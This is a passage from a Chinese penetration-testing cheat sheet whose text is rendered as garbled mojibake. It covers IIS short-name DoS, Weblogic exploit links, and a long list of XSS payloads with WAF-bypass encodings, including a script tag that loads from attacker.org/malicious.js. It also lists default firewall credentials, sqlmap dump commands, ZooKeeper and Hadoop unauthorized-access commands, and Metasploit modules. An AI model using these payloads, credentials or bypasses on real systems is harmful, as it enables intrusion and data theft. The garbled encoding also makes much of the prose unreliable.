    å½“è¯·æ±‚æ–‡ä»¶å¤¹åç§°åŒ…å« ~1 çš„è¯·æ±‚ï¼Œä¼šå¯¼è‡´ä¸å­˜åœ¨è¯¥æ–‡ä»¶çš„ .Net Framework å»é€’å½’æŸ¥è¯¢æ‰€æœ‰æ ¹ç›®å½•ã€‚å¦‚æœåªæœ‰ä¸€ä¸ªâ€œ~1â€æ˜¯æ— æ•ˆçš„ï¼Œå½“â€œ~1â€å¤§äºä¸€ä¸ªï¼Œæ¯”å¦‚åƒè¿™æ ·ï¼š 
    `/wwwtest/fuck~1/~1/~1/~1.aspx`
    æ­¤æ—¶æ–‡ä»¶ç³»ç»Ÿä¼šè¿™æ ·è°ƒç”¨ï¼š
    ```
    \wwwtest                           SUCCESS
    \wwwtest\fuck~1\~1\~1\~1           PATH NOT FOUND
    \wwwtest\fuck~1                    NAME NOT FOUND
    \wwwtest\fuck~1\~1\                PATH NOT FOUND
    \wwwtest\fuck~1\~1\~1\             PATH NOT FOUND
    \wwwtest\fuck~1\~1\~1\~1.aspx      PATH NOT FOUND
    \wwwtest\fuck~1\~1\~1\~1.aspx      PATH NOT FOUND
    \wwwtest\fuck~1\~1\~1              PATH NOT FOUND
    \wwwtest\fuck~1\~1\~1\~1.aspx      PATH NOT FOUND
    \wwwtest\fuck~1\~1\~1              PATH NOT FOUND
    \wwwtest\fuck~1\~1                 PATH NOT FOUND
    \wwwtest\fuck~1                    NAME NOT FOUND
    \wwwtest                           SUCCESS
    \wwwtest                           SUCCESS
    ```
    å¦‚æœæˆ‘ä»¬è¯·æ±‚çš„æ–‡ä»¶/æ–‡ä»¶å¤¹ååŒæ—¶å­˜åœ¨å¤§å°å†™æ—¶ï¼Œè¿™ä¸ªè¯·æ±‚ä¼šè¢«è¯·æ±‚ä¸¤æ¬¡ï¼Œä¸€æ¬¡æ˜¯åŸå°ä¸åŠ¨çš„è¯·æ±‚ï¼Œä¸€æ¬¡æ˜¯å…¨éƒ¨ä½¿ç”¨å°å†™çš„è¯·æ±‚ã€‚

    ä¸‹è¡¨æ˜¾ç¤ºäº†æ¯ä¸ªè¯·æ±‚çš„FSè°ƒç”¨çš„æ•°é‡ï¼ˆWindows 2008 R2, IIS 7.5(latest patch â€“ June 2012), and .Net framework 4.0.30319 (åœ¨åˆ«çš„ç³»ç»Ÿä¸‹å¯èƒ½ä¼šä¸åŒ)ï¼‰
    ![image](../../img/æ¸—é€/1.jpg)

**Weblogic**
- **æ–‡ç« **
    - [åˆ©ç”¨Weblogicè¿›è¡Œå…¥ä¾µçš„ä¸€äº›æ€»ç»“](http://drops.xmd5.com/static/drops/tips-8321.html)

- **CVE-2009-1975**
    - POC | Payload | exp
        - [Oracle WebLogic Server 10.3 - 'console-help.portal' Cross-Site Scripting](https://www.exploit-db.com/exploits/33079)

    - ç¤ºä¾‹
    `http://www.example.com:7011/consolehelp/console-help.portal?_nfpb=true&_pageLabel=ConsoleHelpSearchPage&searchQuery="><script>alert('DSECRG')</script> `

- **CVE-2017-10271**
    - æ–‡ç« 
        - [WebLogic XMLDecoderååºåˆ—åŒ–æ¼æ´å¤ç°](https://mochazz.github.io/2017/12/25/weblogic_xmldecode/)
        - [blog-hugo/content/blog/Weblogic-0day.md](https://github.com/kylingit/blog-hugo/blob/master/content/blog/Weblogic-0day.md)

    - æ£€æµ‹æ–¹æ³•
        è®¿é—®`<ç›®æ ‡IP:ç«¯å£>/wls-wsat/CoordinatorPortType11`

    - POC | Payload | exp
        - [1337g/CVE-2017-10271](https://github.com/1337g/CVE-2017-10271)

- **CVE-2018-2628**
    - æ–‡ç« 
        - [CVE-2018-2628 ç®€å•å¤ç°ä¸åˆ†æ | xxlegend](http://xxlegend.com/2018/04/18/CVE-2018-2628%20%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/)

    - POC | Payload | exp
        - [shengqi158/CVE-2018-2628](https://github.com/shengqi158/CVE-2018-2628)

- **CVE-2018-2893**
    - æ–‡ç« 
        -[å¤©èä¿¡å…³äºCVE-2018-2893 WebLogicååºåˆ—åŒ–æ¼æ´åˆ†æ](https://www.freebuf.com/column/178103.html)

    - POC | Payload | exp
        - [pyn3rd/CVE-2018-2893](https://github.com/pyn3rd/CVE-2018-2893)

- **CVE-2018-2894**
    - æ–‡ç« 
        - [Weblogic CVE-2018-2894 æ¼æ´å¤ç°](https://blog.csdn.net/qq_23936389/article/details/81256015)

    - POC | Payload | exp
        - [LandGrey/CVE-2018-2894](https://github.com/LandGrey/CVE-2018-2894)

- **CVE-2018-3191**
    - æ–‡ç« 
        - [ä»æµé‡ä¾§æµ…è°ˆWebLogicè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆCVE-2018-3191ï¼‰](https://www.jianshu.com/p/f73b162c4649)

    - POC | Payload | exp
        - [voidfyoo/CVE-2018-3191](https://github.com/voidfyoo/CVE-2018-3191)

- **CVE-2018-3245**
    - æ–‡ç« 
        - [weblogicååºåˆ—åŒ–æ¼æ´ cve-2018-3245](https://blog.51cto.com/13770310/2308371)

    - POC | Payload | exp
        - [pyn3rd/CVE-2018-3245](https://github.com/pyn3rd/CVE-2018-3245)

- **CVE-2019-2725 && CNVD-C-2019-48814**
    - æ–‡ç« 
        - [CNVD-C-2019-48814 Weblogic wls9_async_response ååºåˆ—åŒ–RCEå¤ç°](https://www.jianshu.com/p/c4982a845f55)

    - æ£€æµ‹æ–¹æ³•
        ```bash
        <ç›®æ ‡IP:ç«¯å£>/_async/AsyncResponseService
        <ç›®æ ‡IP:ç«¯å£>/wls-wsat/CoordinatorPortType
        ```

    - POC | Payload | exp
        - [MyTools/CVE-2019-2725](https://github.com/No4l/MyTools/tree/master/CVE-2019-2725)
        - [skytina/CNVD-C-2019-48814-COMMON](https://github.com/skytina/CNVD-C-2019-48814-COMMON)

---

### XSS
**xss å¹³å°**
- **å¼€æºå¹³å°**
    - [firesunCN/BlueLotus_XSSReceiver](https://github.com/firesunCN/BlueLotus_XSSReceiver)

- **åœ¨çº¿å¹³å°**
    - http://xssye.com/index.php

**xss æ£€æµ‹ç¯å¢ƒ**
- **æœ¬åœ°é¶æœº**
    1åˆ†é’Ÿæ­å¥½
    ä¸‹ä¸ªphpstudyç›´æ¥å¾€æ ¹ç›®å½•å»ºä¸ª1.php
    ç„¶åè®¿é—® xxx.xxx.xxx.xxx/1.php?parm=æ¥xssä»£ç 
    ```php
    <?php
    $input=$_GET["parm"];
    echo "<div>".$input."</div>";
    ?>
    ```

- **åœ¨çº¿é¶æœº**
    - http://demo.testfire.net/
    - https://juice-shop.herokuapp.com/#/search

**æ–‡ç« **
- [XSSæ’å…¥ç»•è¿‡ä¸€äº›æ–¹å¼æ€»ç»“](https://blog.csdn.net/qq_29277155/article/details/51320064)
- [XSSæ€»ç»“](https://xz.aliyun.com/t/4067)
- [WAFçš„XSSç»•è¿‡å§¿åŠ¿](https://www.freebuf.com/articles/web/81959.html)
- [ä»–å±±ä¹‹çŸ³ | å¯¹ XSS çš„ä¸€æ¬¡æ·±å…¥åˆ†æè®¤è¯†](https://www.freebuf.com/articles/web/195507.html)
- [minimaxir/big-list-of-naughty-strings](https://github.com/minimaxir/big-list-of-naughty-strings)

**å·¥å…·**
- [s0md3v/XSStrike](https://github.com/s0md3v/XSStrike)
    ä¾èµ–
    ```bash
    pip3 install -r requirements.txt

    wget https://github.com/mozilla/geckodriver/releases/download/v0.24.0/geckodriver-v0.24.0-linux64.tar.gz
    mkdir /usr/local/temp
    mv geckodriver /usr/local/temp
    PATH=$PATH:/usr/local/temp/
    ```

    **[ä½¿ç”¨](https://github.com/s0md3v/XSStrike/wiki/Usage#scan-a-single-url)**
    ```bash
    python3 xsstrike.py -u "http://example.com/search.php?q=query"
    python3 xsstrike.py -u "http://example.com/search.php?q=query" --fuzzer
    python3 xsstrike.py -u "http://example.com/search.php?q=query" --crawl
    ```

**ä¸€äº› payload**
```html
Script æ ‡ç­¾
<script>alert(123)</script>
<script>prompt(1);</script>
<script>confirm(1);</script>
<script>\u0061\u006C\u0065\u0072\u0074(1)</script>
<script>+alert(1)</script>
<script>setTimeout(alert(1),0)</script>
<script src=data:text/javascript,alert(1)></script>
<script>alert(String.fromCharCode(49,49))</script>
<<SCRIPT>alert("XSS");
//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
</TITLE><SCRIPT>alert("XSS");</SCRIPT>
<svg><script>123<1>alert(123)</script>
"><script>alert(123)</script>
'><script>alert(123)</script>
><script>alert(123)</script>
</script><script>alert(123)</script>
--><script>alert(123)</script>
><script>alert(123);</script x=
<script>alert/(a/)</script>
<script NAUGHTY_HACKER>alert(1)</script NAUGHTY_HACKER>

ç»•è¿‡è¿›è¡Œä¸€æ¬¡ç§»é™¤æ“ä½œï¼š
<scr<script>ipt>alert("XSS")</scr<script>ipt>
Script æ ‡ç­¾å¯ä»¥ç”¨äºå®šä¹‰ä¸€ä¸ªè¡Œå†…çš„è„šæœ¬æˆ–è€…ä»å…¶ä»–åœ°æ–¹åŠ è½½è„šæœ¬ï¼š
<script>alert("XSS")</script>
<script src="http://attacker.org/malicious.js"></script>
```
```html
<img>
<img src=x onerror=alert(123) />

<input>
<input onfocus="alert('xss');">
<input onblur=alert("xss") autofocus><input autofocus> //ç«äº‰ç„¦ç‚¹,ä»è€Œè§¦å‘onbluräº‹ä»¶
<input onfocus="alert('xss');" autofocus>  //é€šè¿‡autofocuså±æ€§æ‰§è¡Œæœ¬èº«çš„focusäº‹ä»¶,è¿™ä¸ªå‘é‡æ˜¯ä½¿ç„¦ç‚¹è‡ªåŠ¨è·³åˆ°è¾“å…¥å…ƒç´ ä¸Š,è§¦å‘ç„¦ç‚¹äº‹ä»¶,æ— éœ€ç”¨æˆ·å»è§¦å‘
<input type="image" formaction=JaVaScript:alert(0)>

<details>
<details open OntogGle="alert(1)">  //ä½¿ç”¨openå±æ€§è§¦å‘ontoggleäº‹ä»¶,æ— éœ€ç”¨æˆ·å»è§¦å‘

<svg>
<svg onload=alert("xss");>
<svg/onload=prompt(1);>

<select>
<select onfocus=alert(1)></select>
<select onfocus=alert(1) autofocus> //é€šè¿‡autofocuså±æ€§æ‰§è¡Œæœ¬èº«çš„focusäº‹ä»¶

<iframe>
<iframe onload=alert("xss");></iframe>
<IFRAME SRC="javascript:alert(29);"></IFRAME>

<video>
<video><source onerror="alert(1)">
<video poster=javascript:alert(1)//></video> // Works Upto Opera 10.5

<audio>
<audio src=x  onerror=alert("xss");>

<body>
<body/onload=alert("xss");>
<body 
onscroll=alert("xss");><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>    //åˆ©ç”¨æ¢è¡Œç¬¦ä»¥åŠautofocus,è‡ªåŠ¨å»è§¦å‘onscrolläº‹ä»¶,æ— éœ€ç”¨æˆ·å»è§¦å‘
<body onload=prompt(1);>

<textarea>
<textarea onfocus=alert("xss"); autofocus>

<keygen>
<keygen autofocus onfocus=alert(1)> //ä»…é™ç«ç‹

<marquee>
<marquee onstart=alert(1)>hack the planet</marquee>  //Chromeä¸è¡Œ,ç«ç‹å’ŒIEéƒ½å¯ä»¥
<marquee behavior="alternate" onstart=alert(1)>hack the planet</marquee>
<marquee loop="1" onfinish=alert(1)>hack the planet</marquee>
<marquee/onstart=confirm(2)>/

<isindex>
<isindex type=image src=1 onerror=alert("xss")>   //ä»…é™äºIE

<anytag>
<anytag onmouseover=alert(15)>M
<anytag onclick=alert(16)>M

<a>
<a onmouseover=alert(17)>M
<a onclick=alert(18)>M
<a href=javascript:alert(19)>M
<a href="javascript:alert('test')">link</a>

<div>
<div onclick="alert('xss')">
<div onmouseenter="alert('xss')">   //å½“ç”¨æˆ·é¼ æ ‡ç§»åŠ¨åˆ° div ä¸Šæ—¶å°±ä¼šè§¦å‘æˆ‘ä»¬çš„ä»£ç ã€‚
<div contextmenu="xss">Right-Click Here<menu id="xss" onshow="alert(1)">

<style>
<style onload=alert(1) />

<form>
<form/action=javascript:alert(22)><input/type=submit>
<form onsubmit=alert(23)><button>M

<object>
<object data="javascript:alert(document.domain)">
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=">

<embed>
<embed/src=javascript:alert(29);>
```

```html
åˆ©ç”¨linkè¿œç¨‹åŒ…å«jsæ–‡ä»¶
PSï¼šåœ¨æ— CSPçš„æƒ…å†µä¸‹æ‰å¯ä»¥ 
<link rel=import href="http://127.0.0.1/1.js">


javascriptä¼ªåè®®
<a>æ ‡ç­¾
<a href="javascript:alert(`xss`);">xss</a>

<iframe>æ ‡ç­¾
<iframe src=javascript:alert('xss');></iframe>

<img>æ ‡ç­¾
<img src=javascript:alert('xss')>//IE7ä»¥ä¸‹

<form>æ ‡ç­¾
<form action="Javascript:alert(1)"><input type=submit>


å…¶å®ƒ
expressionå±æ€§
<img style="xss:expression(alert('xss''))"> // IE7ä»¥ä¸‹
<div style="color:rgb(''ï¿½x:expression(alert(1))"></div> //IE7ä»¥ä¸‹
<style>#test{x:expression(alert(/XSS/))}</style> // IE7ä»¥ä¸‹

backgroundå±æ€§
<table background=javascript:alert(1)></table> //åœ¨Opera 10.5å’ŒIE6ä¸Šæœ‰æ•ˆ

æ‚é¡¹
';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode<script>alert('xss')</script>
<math><a xlink:href="//baidu.com">click
```

**å¥‡æŠ€æ·«å·§**
1. ä½¿ç”¨æ— å®³çš„payload,ç±»ä¼¼`<b>,<i>,<u>`è§‚å¯Ÿå“åº”,åˆ¤æ–­åº”ç”¨ç¨‹åºæ˜¯å¦è¢«HTMLç¼–ç ,æ˜¯å¦æ ‡ç­¾è¢«è¿‡æ»¤,æ˜¯å¦è¿‡æ»¤<>ç­‰ç­‰ï¼›
2. å¦‚æœè¿‡æ»¤é—­åˆæ ‡ç­¾,å°è¯•æ— é—­åˆæ ‡ç­¾çš„payload`<b,<i,<marquee`è§‚å¯Ÿå“åº”ï¼›
```html
ç»•è¿‡é•¿åº¦é™åˆ¶
"onclick=alert(1)//
"><!--
--><script>alert(xss);<script>
```
```html
è¿‡æ»¤ç©ºæ ¼
ç”¨/ä»£æ›¿ç©ºæ ¼
<img/src="x"/onerror=alert("xss");>
```

```html
è¿‡æ»¤å…³é”®å­—
å¤§å°å†™ç»•è¿‡
<ImG sRc=x onerRor=alert("xss");>
<scRiPt>alert(1);</scrIPt>


åŒå†™å…³é”®å­—
æœ‰äº›wafå¯èƒ½ä¼šåªæ›¿æ¢ä¸€æ¬¡ä¸”æ˜¯æ›¿æ¢ä¸ºç©º,è¿™ç§æƒ…å†µä¸‹æˆ‘ä»¬å¯ä»¥è€ƒè™‘åŒå†™å…³é”®å­—ç»•è¿‡
<imimgg srsrcc=x onerror=alert("xss");>


å­—ç¬¦æ‹¼æ¥
åˆ©ç”¨eval
<img src="x" onerror="a=`aler`;b=`t`;c='(`xss`);';eval(a+b+c)">

åˆ©ç”¨top
<script>top["al"+"ert"](`xss`);</script>


å…¶å®ƒå­—ç¬¦æ··æ·†
æœ‰çš„wafå¯èƒ½æ˜¯ç”¨æ­£åˆ™è¡¨è¾¾å¼å»æ£€æµ‹æ˜¯å¦æœ‰xssæ”»å‡»,å¦‚æœæˆ‘ä»¬èƒ½fuzzå‡ºæ­£åˆ™çš„è§„åˆ™,åˆ™æˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨å…¶å®ƒå­—ç¬¦å»æ··æ·†æˆ‘ä»¬æ³¨å…¥çš„ä»£ç äº†
ä¸‹é¢ä¸¾å‡ ä¸ªç®€å•çš„ä¾‹å­
å¯åˆ©ç”¨æ³¨é‡Šã€æ ‡ç­¾çš„ä¼˜å…ˆçº§ç­‰
1.<<script>alert("xss");//<</script>
2.<title><img src=</title>><img src=x onerror="alert(`xss`);"> //å› ä¸ºtitleæ ‡ç­¾çš„ä¼˜å…ˆçº§æ¯”imgçš„é«˜,æ‰€ä»¥ä¼šå…ˆé—­åˆtitle,ä»è€Œå¯¼è‡´å‰é¢çš„imgæ ‡ç­¾æ— æ•ˆ
3.<SCRIPT>var a="\\";alert("xss");//";</SCRIPT>


ç¼–ç ç»•è¿‡
Unicodeç¼–ç ç»•è¿‡
<img src="x" onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#34;&#120;&#115;&#115;&#34;&#41;&#59;">

<img src="x" onerror="eval('\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0078\u0073\u0073\u0022\u0029\u003b')">

urlç¼–ç ç»•è¿‡
<img src="x" onerror="eval(unescape('%61%6c%65%72%74%28%22%78%73%73%22%29%3b'))">

<iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>

Asciiç ç»•è¿‡
<img src="x" onerror="eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,59))">

hexç»•è¿‡
<img src=x onerror=eval('\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29')>

å…«è¿›åˆ¶
<img src=x onerror=alert('\170\163\163')>

base64ç»•è¿‡
<img src="x" onerror="eval(atob('ZG9jdW1lbnQubG9jYXRpb249J2h0dHA6Ly93d3cuYmFpZHUuY29tJw=='))">

<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=">
```
```html
è¿‡æ»¤åŒå¼•å·,å•å¼•å·
1.å¦‚æœæ˜¯htmlæ ‡ç­¾ä¸­,æˆ‘ä»¬å¯ä»¥ä¸ç”¨å¼•å·ã€‚å¦‚æœæ˜¯åœ¨jsä¸­,æˆ‘ä»¬å¯ä»¥ç”¨åå¼•å·ä»£æ›¿å•åŒå¼•å·
<img src="x" onerror=alert(`xss`);>
2.ä½¿ç”¨ç¼–ç ç»•è¿‡,å…·ä½“çœ‹ä¸Šé¢æˆ‘åˆ—ä¸¾çš„ä¾‹å­,æˆ‘å°±ä¸å¤šèµ˜è¿°äº†
```
```html
è¿‡æ»¤æ‹¬å·
å½“æ‹¬å·è¢«è¿‡æ»¤çš„æ—¶å€™å¯ä»¥ä½¿ç”¨throwæ¥ç»•è¿‡
<svg/onload="window.onerror=eval;throw'=alert\x281\x29';">
```
```html
è¿‡æ»¤urlåœ°å€
ä½¿ç”¨urlç¼–ç 
<img src="x" onerror=document.location=`http://%77%77%77%2e%62%61%69%64%75%2e%63%6f%6d/`>


ä½¿ç”¨IP
1.åè¿›åˆ¶IP
<img src="x" onerror=document.location=`http://2130706433/`>

2.å…«è¿›åˆ¶IP
<img src="x" onerror=document.location=`http://0177.0.0.01/`>

3.hex
<img src="x" onerror=document.location=`http://0x7f.0x0.0x0.0x1/`>

4.htmlæ ‡ç­¾ä¸­ç”¨//å¯ä»¥ä»£æ›¿http://
<img src="x" onerror=document.location=`//www.baidu.com`>

5.ä½¿ç”¨\\
ä½†æ˜¯è¦æ³¨æ„åœ¨windowsä¸‹\æœ¬èº«å°±æœ‰ç‰¹æ®Šç”¨é€”,æ˜¯ä¸€ä¸ªpath çš„å†™æ³•,æ‰€ä»¥\\åœ¨Windowsä¸‹æ˜¯fileåè®®,åœ¨linuxä¸‹æ‰ä¼šæ˜¯å½“å‰åŸŸçš„åè®®

6.ä½¿ç”¨ä¸­æ–‡é€—å·ä»£æ›¿è‹±æ–‡é€—å·
å¦‚æœä½ åœ¨ä½ åœ¨åŸŸåä¸­è¾“å…¥ä¸­æ–‡å¥å·æµè§ˆå™¨ä¼šè‡ªåŠ¨è½¬åŒ–æˆè‹±æ–‡çš„é€—å·
<img src="x" onerror="document.location=`http://wwwã€‚baiduã€‚com`">//ä¼šè‡ªåŠ¨è·³è½¬åˆ°ç™¾åº¦
```

**å¦‚ä½•é˜²æ­¢xss**
- è¿‡æ»¤ä¸€äº›å±é™©å­—ç¬¦,ä»¥åŠè½¬ä¹‰& < > " ' /ç­‰å±é™©å­—ç¬¦
- HTTP-only Cookie: ç¦æ­¢ JavaScript è¯»å–æŸäº›æ•æ„Ÿ Cookie,æ”»å‡»è€…å®Œæˆ XSS æ³¨å…¥åä¹Ÿæ— æ³•çªƒå–æ­¤Cookieã€‚
- è®¾ç½®CSP(Content Security Policy)
- è¾“å…¥å†…å®¹é•¿åº¦é™åˆ¶

---

### å®‰é˜²è®¾å¤‡
**é»˜è®¤å£ä»¤**
```bash
å¤©èä¿¡é˜²ç«å¢™
8080
ç”¨æˆ·å:superman å¯†ç :talentã€talent!23
test/123456

è”æƒ³ç½‘å¾¡é˜²ç«å¢™
8889
ç”¨æˆ·å:admin    å¯†ç :leadsec@7766ã€administratorã€bane@7766

æ·±ä¿¡æœé˜²ç«å¢™
ç”¨æˆ·åï¼šadmin   å¯†ç ï¼šadmin

å¯æ˜æ˜Ÿè¾°
8889
ç”¨æˆ·åï¼šadmin   å¯†ç ï¼šbane@7766ã€admin@123

juniper
ç”¨æˆ·å:netscreen    å¯†ç :netscreen

Cisco
ç”¨æˆ·å:admin    å¯†ç :cisco

Huawei
ç”¨æˆ·å:admin    å¯†ç :Admin@123
eudemon eudemon

H3C
ç”¨æˆ·å:admin    å¯†ç :admin

ç»¿ç›ŸIPS
ç”¨æˆ·å: weboper å¯†ç : weboper

ç½‘ç¥é˜²ç«å¢™
ç”¨æˆ·åï¼šadmin   å¯†ç ï¼šfirewall

åä¸ºVPN
è´¦å·ï¼šroot  å¯†ç ï¼šmduadmin

è¿ªæ™®
admin/admin_default

å±±çŸ³
hillstone/hillstone

å®‰æ’æ˜å¾¡é˜²ç«å¢™
admin/adminadmin

é½æ²»å ¡å’æœº
shterm/shterm
```

**ç»•waf**
- éé»˜è®¤ç«¯å£å¯¼è‡´å®Œå…¨ç»•è¿‡
    æµ‹è¯•HTTPSæœåŠ¡
    æµ‹è¯•8080/8081ç­‰ç«¯å£çš„æœåŠ¡

- è·¯å¾„é™åˆ¶ç»•è¿‡
è¿™åªWAFä¼šå¯¹è®¿é—®æ•æ„Ÿè·¯å¾„åŠ ä»¥é™åˆ¶,ä½†æ˜¯åŠ ä¸Šå‚æ•°å¯ä»¥ç»•è¿‡ã€‚
æ¯”å¦‚æƒ³è®¿é—®`xxx.â–ˆâ–ˆ.edu.cn/phpmyadmin/`ä¼šè¢«æ‹¦æˆª,è®¿é—®`xxx.â–ˆâ–ˆ.edu.cn/phpmyadmin/?id=1`å¯ä»¥ç»•è¿‡

- XSSé˜²æŠ¤ç»•è¿‡
æœ€ç›´ç™½çš„payloadç±»ä¼¼`<script> alert('xss'); </script>`
ä½†æ˜¯ä½ å¯ä»¥ç”¨`<script src=æ¥è¿œç¨‹åŠ è½½è„šæœ¬,å¹¶ç»•è¿‡é˜²æŠ¤`
`http://â–ˆâ–ˆ.â–ˆâ–ˆ.edu.cn/â–ˆâ–ˆ/â–ˆâ–ˆ?search=naive%22%3E%20%3Cmeta%20name=%22referrer%22%20content=%22never%22%20%3E%20%3Cscript%20src=%22https://cdn.jsdelivr.net/gh/TomAPU/xsstest/test.js%22%3E%3C/script%3E%20%3C!--`

- SQLæ³¨å…¥ç»•è¿‡
Unionæ³¨å…¥æ—¶`union select 1 from 2`æ›¿æ¢æˆ`union/*fuckyou//*a*//*!select*/1/*fuckyou//*a*//*!from*/2`
order byæµ‹è¯•æ—¶ç›´æ¥æŠŠç©ºæ ¼æ¢æˆ`/**//**/`

**Reference**
- [å›½å†…é˜²ç«å¢™é»˜è®¤å¯†ç ](https://www.qugcloud.cn/2018/05/19/firewall-pwd/)
- [â–ˆâ–ˆå¤§å­¦é€šç”¨å‹WAFä¸å®Œå…¨ç»•è¿‡ï¼ˆæŒç»­éå®šæœŸæ›´æ–°ï¼‰ ](https://drivertom.blogspot.com/2018/12/waf.html)

---

### æ³¨å…¥
#### sql
**sqlmap**
```bash
sqlmap -u URL	#åˆ¤æ–­æ³¨å…¥
sqlmap -u URL --current-db	 #è·å–å½“å‰æ•°æ®åº“
sqlmap -u URL -D DATABASE --tables		#è·å–æ•°æ®åº“è¡¨
sqlmap -u URL -D DATABASE -T TABLES --columns	#è·å–æŒ‡å®šè¡¨çš„åˆ—å
sqlmap -u URL -D DATABASE -T TABLES -C COLUMNS --dump		#è·å–æŒ‡å®šè¡¨çš„åˆ—å

sqlmap -r aaa.txt  #postå‹æ³¨å…¥
```

---

### å§¿åŠ¿
- urlè·³è½¬æ¼æ´
- æ–‡ä»¶åŒ…å«æ¼æ´
- æ–‡ä»¶è§£ææ¼æ´
- ä»»æ„å·ç æ³¨å†Œ
- ä»»æ„æ–‡ä»¶ä¸‹è½½
- æ–‡ä»¶ä¸Šä¼ æ¼æ´
- çŸ­ä¿¡é‡ç½®å¯†ç æ¥å£(çŸ­ä¿¡è½°ç‚¸)
- å¯†ç é‡ç½®é‚®ä»¶è½°ç‚¸
- è¶Šæƒ
- è´¦å·å¯†ç çˆ†ç ´
- éªŒè¯ç ç»•è¿‡

---

## æœ¬åœ°ä¸šåŠ¡/è½¯ä»¶vul
### Andorid
**ESFileExplorers**
- **CVE-2019-6447**
    - POC | Payload | exp
        - [fs0c131y/ESFileExplorerOpenPortVuln](https://github.com/fs0c131y/ESFileExplorerOpenPortVuln)

---

### Linux
**Logwatch**
- **CVE-2011-1018 Logwatch logwatch.plä»»æ„å‘½ä»¤æ‰§è¡Œæ¼æ´**
    - POC | Payload | exp
        - [Logwatch Log File - Special Characters Privilege Escalation](https://www.exploit-db.com/exploits/35386)

---

### Windows
**Firefox**
- **CVE-2019-9810**
    - POC | Payload | exp
        - [0vercl0k/CVE-2019-9810](https://github.com/0vercl0k/CVE-2019-9810)

**Evernote**
- **Evernote 7.9**
    - æ–‡ç« 
        - [Code execution â€“ Evernote](https://securityaffairs.co/wordpress/84037/hacking/local-file-path-traversal-evernote.html)

---

## å¯¹å¤–ä¸šåŠ¡/è½¯ä»¶vul
### åˆ†å¸ƒå¼
**Hadoop**
- **æ–‡ç« **
    - [Hadoopæ¸—é€åŠå®‰å…¨åŠ å›º](http://www.polaris-lab.com/index.php/archives/187/)
    - [æŒ–æ˜åˆ†å¸ƒå¼ç³»ç»Ÿâ€”â€”Hadoopçš„æ¼æ´](https://zhuanlan.zhihu.com/p/28901633)

- **Hadoop æœªæˆæƒè®¿é—®**
    - ç¤ºä¾‹
        `curl -i -X PUT â€œhttp://ip:50070/webhdfs/v1/NODATA4U_SECUREYOURSHIT?op=MKDIRSâ€œ`

**ZooKeeper**
- **ZooKeeper æœªæˆæƒè®¿é—®æ¼æ´**
    - æ–‡ç« 
        - [ZooKeeper æœªæˆæƒè®¿é—®æ¼æ´](https://blog.csdn.net/qq_23936389/article/details/83826028)
        - [æ”»å‡»å¤§æ•°æ®åº”ç”¨ï¼šZooKeeper](http://www.polaris-lab.com/index.php/archives/41/)

    - å¤ç°ï¼Ÿ
        ```bash
        wget https://mirrors.tuna.tsinghua.edu.cn/apache/zookeeper/zookeeper-3.4.14/zookeeper-3.4.14.tar.gz
        tar -zxvf zookeeper-3.4.14.tar.gz
        cd zookeeper-3.4.14/
        cd conf/
        ```
        ```vim
        vim zoo.cfg  # é…ç½®å•æœºæ¨¡å¼

        tickTime=2000
        dataDir=/tmp/zookeeper/data
        dataLogDir=/tmp/zookeeper/logs
        clientPort=2181
        ```
        ```bash
        cd ..
        bin/zkServer.sh start   # å¯åŠ¨
        bin/zkCli.sh -server 127.0.0.1:2181 #è¿æ¥ server
        ```

    - åˆ©ç”¨
        ```bash
        echo envi|nc <ip> 2181 # æ‰“å°æœ‰å…³æœåŠ¡ç¯å¢ƒçš„è¯¦ç»†ä¿¡æ¯
        echo dump |ncat <ip> 2181 # åˆ—å‡ºæœªå®Œæˆçš„ä¼šè¯å’Œä¸´æ—¶èŠ‚ç‚¹
        echo reqs |ncat <ip> 2181 # åˆ—å‡ºæœªå®Œæˆçš„è¯·æ±‚
        echo ruok |ncat <ip> 2181 # æµ‹è¯•æœåŠ¡å™¨æ˜¯å¦è¿è¡Œåœ¨éé”™è¯¯çŠ¶æ€
        echo stat |ncat <ip> 2181 # åˆ—å‡ºå…³äºæ€§èƒ½å’Œè¿æ¥çš„å®¢æˆ·ç«¯çš„ç»Ÿè®¡ä¿¡æ¯

        ./zkCli.sh -server <ip>:port
        ```

- **CVE-2014-085 ZooKeeperä¿¡æ¯æ³„éœ²æ¼æ´**
    - æ–‡ç« 
        - [ZooKeeperä¿¡æ¯æ³„éœ²æ¼æ´ï¼ˆCVE-2014-085ï¼‰](https://blog.csdn.net/u011721501/article/details/44062617)

---

### æ•°æ®åº“
**MS SQL Server**
- **æ–‡ç« **
    - [ä»æ”»å‡»MS SQL Serveråˆ°è·å¾—ç³»ç»Ÿè®¿é—®æƒé™](https://www.freebuf.com/articles/database/22997.html)

**mysql**
- **UDFææƒ**
    - æ–‡ç« 
        - [Command execution with a MySQL UDF](http://bernardodamele.blogspot.com/2009/01/command-execution-with-mysql-udf.html)

    - POC | Payload | exp
        - [mysqludf/lib_mysqludf_sys](https://github.com/mysqludf/lib_mysqludf_sys)

**oracle**
- **CVE-2010-3600 Oracle Enterprise Manager Grid Control JSPä»£ç æ‰§è¡Œæ¼æ´**
    - MSFæ¨¡å—
    ```bash
    use exploit/windows/oracle/client_system_analyzer_upload
    ```

- **CVE-2012-1675 Oracle TNS Listener Remote Poisoning**
    - æ–‡ç« 
        -[Oracle TNS Listener Remote Poisoning](http://www.cnblogs.com/zhuxr/p/9618512.html)

    - MSFæ¨¡å—
    ```bash
